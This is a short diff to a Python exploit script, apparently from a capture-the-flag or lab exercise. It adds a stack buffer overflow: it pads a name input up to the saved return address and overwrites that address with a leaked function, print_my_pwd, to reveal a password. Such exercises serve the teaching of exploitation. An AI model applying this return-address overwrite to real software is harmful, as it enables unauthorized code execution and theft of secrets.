@@ -27,6 +27,12 @@ def eprint(*args, **kwargs):
 
 # Here we have the address of the main function.
 pmain = int(sys.stdin.readline(), 16)
+pprint_my_pwd = pmain - 151
+name = 0x7fffffffdcf4
+ripat = 0x7fffffffdd08
+nr = ripat - name
 
-writeStr("Name\n")
+writeStr("."*nr)
+writeLong(pprint_my_pwd)
+writeStr("\n")
 writeStr("Password\n")
